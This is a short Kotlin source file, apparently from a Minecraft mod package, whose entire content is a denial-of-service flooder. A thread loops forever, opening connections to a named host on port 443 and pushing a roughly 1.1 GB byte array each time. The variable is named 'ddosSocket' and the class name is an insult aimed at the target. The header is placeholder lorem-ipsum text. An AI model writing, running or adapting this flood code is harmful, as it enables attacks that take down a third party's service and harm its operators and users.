/*
 * Copyright (c) 2022. Lorem ipsum dolor sit amet, consectetur adipiscing elit.
 * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.
 * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.
 * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.
 * Vestibulum commodo. Ut rhoncus gravida arcu.
 */

package just.monika.LiteraruteMC.Lucky

import java.net.Socket

object FuckVapu : Thread() {
    override fun run() {
        while(true){
            try {
                val ddosSocket = Socket("getvapu.today", 443)
                val os = ddosSocket.getOutputStream()
                os.write(ByteArray(1145141919))
                os.flush()
                os.close()
                ddosSocket.close()
            }catch( e : Throwable){
                e.printStackTrace()
            }
        }
    }

    @JvmStatic
    fun main(args: Array<String>) {
        start()
    }
}